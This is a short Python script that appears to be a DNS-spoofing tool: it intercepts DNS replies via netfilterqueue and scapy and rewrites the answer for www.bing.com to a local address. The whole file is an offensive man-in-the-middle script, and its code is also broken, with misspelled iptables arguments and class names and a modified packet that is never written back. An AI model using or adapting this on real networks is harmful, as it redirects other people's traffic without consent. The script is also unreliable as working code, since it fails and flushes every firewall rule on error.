#!/usr/bin/env python
import netfilterqueue
import subprocess
import optparse
import scapy.all as scapy


def process_packet(packet):
    ip_packet = scapy.IP(packet.get_payload())
    if ip_packet.haslayer(scapy.DNSRR):
        qname = ip_packet[scapy.DNSQR].qname
        if "www.bing.com" == qname:
            print("[+] Spoofing DNS target.")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.1")
            ip_packet[scapy.DNS].an = answer
            ip_packet[scapy.DNS].ancount = 1
            del ip_packet[scapy.IP].len
            del ip_packet[scapy.IP].chksum
            del ip_packet[scapy.UDP].len
            del ip_packet[scapy.UDP].chksum
    packet.accept()


try:
    subprocess.call(["iptables", "-I", "UOTPUT", "-j", "NFQUEUE ", "--gueue-num 0"])
    queue = netfilterqueue.NerfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except Exception:
    subprocess.call(["iptables", "-F"])
    print("[-] Detected CTRL + C ...... \n[+] Quitting .....")